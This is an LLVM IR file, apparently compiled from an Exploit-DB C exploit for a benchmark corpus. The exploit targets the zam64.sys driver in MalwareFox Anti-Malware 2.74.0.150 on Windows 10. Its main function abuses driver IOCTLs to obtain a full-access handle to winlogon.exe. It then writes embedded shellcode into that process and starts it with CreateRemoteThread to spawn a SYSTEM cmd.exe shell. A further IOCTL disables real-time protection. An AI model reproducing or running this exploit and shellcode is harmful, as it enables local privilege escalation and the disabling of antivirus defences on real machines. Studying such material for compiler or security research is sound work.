; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43973.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43973.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [91 x i8] c"===      MalwareFox Anti-Malware 2.74.0.150 zam64.sys Local Privilege Escalation      ===\0A\00", align 1
@.str.1 = private unnamed_addr constant [91 x i8] c"                              Tested on Windows 10 64-bit                                \0A\00", align 1
@.str.2 = private unnamed_addr constant [90 x i8] c"                                   Souhail Hammou                                      \0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [105 x i8] c"[*] Stage 1: Registering the process with the driver by connecting to the minifilter communication port\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"\\\\.\\ZemanaAntiMalware\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@FILE_ATTRIBUTE_NORMAL = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [28 x i8] c"\09[-] Registration Failed !\0A\00", align 1
@.str.6 = private unnamed_addr constant [40 x i8] c"\09[+] Process registered.\0A[*] Stage 2: \0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"\09[+] Getting Winlogon's PID\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"\09[-] GetWinlogonPID() failed !\0A\00", align 1
@.str.9 = private unnamed_addr constant [94 x i8] c"\09[+] (IOCTL) Opening a full access, user-mode accessible handle from kernel-mode to winlogon\0A\00", align 1
@.str.10 = private unnamed_addr constant [42 x i8] c"\09[-] DeviceIoControl 0x8000204C failed !\0A\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"\09[+] Allocating executable memory in winlogon.exe using the full access handle\0A\00", align 1
@MEM_RESERVE = common dso_local global i32 0, align 4
@MEM_COMMIT = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [30 x i8] c"\09[-] VirtualAllocEx failed !\0A\00", align 1
@.str.13 = private unnamed_addr constant [44 x i8] c"\09[+] Writing shellcode to allocated memory\0A\00", align 1
@__const.main.buf = private unnamed_addr constant [276 x i8] c"\FCH\83\E4\F0\E8\C0\00\00\00AQAPRQVH1\D2eH\8BR`H\8BR\18H\8BR H\8BrPH\0F\B7JJM1\C9H1\C0\AC<a|\02, A\C1\C9\0DA\01\C1\E2\EDRAQH\8BR \8BB<H\01\D0\8B\80\88\00\00\00H\85\C0tgH\01\D0P\8BH\18D\8B@ I\01\D0\E3VH\FF\C9A\8B4\88H\01\D6M1\C9H1\C0\ACA\C1\C9\0DA\01\C18\E0u\F1L\03L$\08E9\D1u\D8XD\8B@$I\01\D0fA\8B\0CHD\8B@\1CI\01\D0A\8B\04\88H\01\D0AXAX^YZAXAYAZH\83\EC AR\FF\E0XAYZH\8B\12\E9W\FF\FF\FF]H\BA\01\00\00\00\00\00\00\00H\8D\8D\01\01\00\00A\BA1\8Bo\87\FF\D5\BB\E0\1D*\0AA\BA\A6\95\BD\9D\FF\D5H\83\C4(<\06|\0A\80\FB\E0u\05\BBG\13roj\00YA\89\DA\FF\D5cmd.exe\00\00", align 16
@.str.14 = private unnamed_addr constant [34 x i8] c"\09[-] WriteProcessMemory Failed !\0A\00", align 1
@.str.15 = private unnamed_addr constant [28 x i8] c"\09[+] Spawning SYSTEM shell\0A\00", align 1
@.str.16 = private unnamed_addr constant [86 x i8] c"\09[-] CreateRemoteThread Failed! Did you compile the exploit as a 64-bit executable ?\0A\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"[*] Bonus:\0A\09[+] Disabling real-time protection\0A\00", align 1
@.str.18 = private unnamed_addr constant [42 x i8] c"\09[-] DeviceIoControl 0x80002090 failed !\0A\00", align 1
@.str.19 = private unnamed_addr constant [29 x i8] c"\09[+] RT protection disabled.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca [276 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.1, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.2, i64 0, i64 0))
  %15 = call i32 @printf(i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.3, i64 0, i64 0))
  %16 = load i32, i32* @GENERIC_READ, align 4
  %17 = load i32, i32* @GENERIC_WRITE, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @OPEN_EXISTING, align 4
  %20 = load i32, i32* @FILE_ATTRIBUTE_NORMAL, align 4
  %21 = call i64 @CreateFile(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i32 %18, i32 0, i32* null, i32 %19, i32 %20, i32* null)
  store i64 %21, i64* %10, align 8
  %22 = load i64, i64* %10, align 8
  %23 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %24 = icmp eq i64 %22, %23
  br i1 %24, label %25, label %26

25:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %84

26:                                               ; preds = %2
  %27 = call i32 (...) @RegisterProcessByCommunicationPort()
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %31, label %29

29:                                               ; preds = %26
  %30 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

31:                                               ; preds = %26
  %32 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0))
  %33 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0))
  %34 = call i32 (...) @GetWinlogonPID()
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %39, label %37

37:                                               ; preds = %31
  %38 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

39:                                               ; preds = %31
  %40 = call i32 @printf(i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.9, i64 0, i64 0))
  %41 = load i64, i64* %10, align 8
  %42 = call i32 @DeviceIoControl(i64 %41, i32 -2147475380, i32* %7, i32 4, i64* %8, i32 8, i32* %6, i32* null)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %46, label %44

44:                                               ; preds = %39
  %45 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

46:                                               ; preds = %39
  %47 = call i32 @printf(i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i64 0, i64 0))
  %48 = load i64, i64* %8, align 8
  %49 = load i32, i32* @MEM_RESERVE, align 4
  %50 = load i32, i32* @MEM_COMMIT, align 4
  %51 = or i32 %49, %50
  %52 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %53 = call i32 @VirtualAllocEx(i64 %48, i32* null, i32 4096, i32 %51, i32 %52)
  store i32 %53, i32* %9, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %57, label %55

55:                                               ; preds = %46
  %56 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

57:                                               ; preds = %46
  %58 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.13, i64 0, i64 0))
  %59 = bitcast [276 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %59, i8* align 16 getelementptr inbounds ([276 x i8], [276 x i8]* @__const.main.buf, i32 0, i32 0), i64 276, i1 false)
  %60 = load i64, i64* %8, align 8
  %61 = load i32, i32* %9, align 4
  %62 = getelementptr inbounds [276 x i8], [276 x i8]* %11, i64 0, i64 0
  %63 = call i32 @WriteProcessMemory(i64 %60, i32 %61, i8* %62, i32 276, i32* %6)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %67, label %65

65:                                               ; preds = %57
  %66 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

67:                                               ; preds = %57
  %68 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.15, i64 0, i64 0))
  %69 = load i64, i64* %8, align 8
  %70 = load i32, i32* %9, align 4
  %71 = call i32 @CreateRemoteThread(i64 %69, i32* null, i32 0, i32 %70, i32* null, i32 0, i32* null)
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %75, label %73

73:                                               ; preds = %67
  %74 = call i32 @printf(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.16, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

75:                                               ; preds = %67
  %76 = call i32 @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i64 0, i64 0))
  %77 = load i64, i64* %10, align 8
  %78 = call i32 @DeviceIoControl(i64 %77, i32 -2147475312, i32* null, i32 0, i64* null, i32 0, i32* %6, i32* null)
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %82, label %80

80:                                               ; preds = %75
  %81 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.18, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

82:                                               ; preds = %75
  %83 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.19, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %84

84:                                               ; preds = %82, %80, %73, %65, %55, %44, %37, %29, %25
  %85 = load i32, i32* %3, align 4
  ret i32 %85
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @RegisterProcessByCommunicationPort(...) #1

declare dso_local i32 @GetWinlogonPID(...) #1

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i64*, i32, i32*, i32*) #1

declare dso_local i32 @VirtualAllocEx(i64, i32*, i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @WriteProcessMemory(i64, i32, i8*, i32, i32*) #1

declare dso_local i32 @CreateRemoteThread(i64, i32*, i32, i32, i32*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
